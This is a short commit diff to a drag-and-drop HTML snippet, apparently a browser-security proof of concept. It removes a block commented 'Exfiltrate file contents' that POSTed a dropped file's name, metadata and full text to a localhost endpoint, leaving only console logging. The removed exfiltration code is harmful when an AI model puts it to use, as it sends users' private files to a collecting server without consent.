ace4684d94b2d0c75fc9c4939f14388fde4cd51f
Fergal Daly <fergal@chromium.org>
2026-05-25 07:47:35 +0000

    don't post the file

--- html-snippets/drag-drop/inner.js
+++ html-snippets/drag-drop/inner.js
@@ -4,18 +4,8 @@ document.addEventListener('drop', async (e) => {
     const handle = await item.getAsFileSystemHandle();
     if (handle && handle.kind === 'file') {
       const file = await handle.getFile();
-	const contents = await file.text();
-	console.log(contents);
-      // Exfiltrate file contents
-	fetch('https://localhost:8000/post', {
-        method: 'POST',
-        body: JSON.stringify({
-          name: file.name,
-          size: file.size,
-          type: file.type,
-          contents: contents
-        })
-      });
+	    const contents = await file.text();
+	    console.log(contents);
     }
   }
 });
